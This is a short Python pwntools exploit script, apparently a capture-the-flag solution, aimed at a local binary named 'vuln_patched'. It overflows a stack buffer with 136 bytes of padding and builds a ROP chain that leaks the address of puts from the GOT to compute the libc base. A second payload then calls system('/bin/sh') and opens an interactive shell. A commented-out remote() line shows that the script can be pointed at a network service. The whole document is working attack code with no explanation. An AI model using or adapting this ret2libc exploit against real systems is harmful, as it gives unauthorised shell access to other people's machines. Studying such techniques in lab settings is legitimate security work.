#!/usr/bin/env python3

from pwn import *

exe = "./vuln_patched"
libc = ELF("./libc.so.6", checksec=False)
elf = context.binary = ELF(exe, checksec=False)
ld = ELF("./ld-2.27.so", checksec=False)

context.log_level = "debug"

# host,port = '',

p = process(exe)
# p = remote(host,port)

padding = 136
puts_offset = libc.symbols["puts"]


pop_rdi = 0x0000000000400913

p.recvuntil(b"!\n")

payload = flat(
    asm("nop") * padding, pop_rdi, elf.got["puts"], elf.plt["puts"], elf.symbols["main"]
)

p.sendline(payload)
p.recvline()
leak = p.recv(6) + b"\x00\x00"
leak = u64(leak)
log.info(f"leak is -> {hex(leak)}")
libc.address = leak - puts_offset
binsh = next(libc.search(b"/bin/sh\x00"))
system = libc.symbols["system"]
ret = 0x000000000040052E

log.info(f"Libc address -> {hex(libc.address)}")
log.info(f"binsh is -> {hex(binsh)}")
log.info(f"system address is -> {hex(system)}")

payload2 = flat(
    asm("nop") * padding,
    pop_rdi,
    binsh,
    ret,
    #   pop_rsi_r15_ret,
    #  0x0,
    #   0x0,
    system,
    elf.symbols["main"],
)
p.sendline(payload2)
p.interactive()
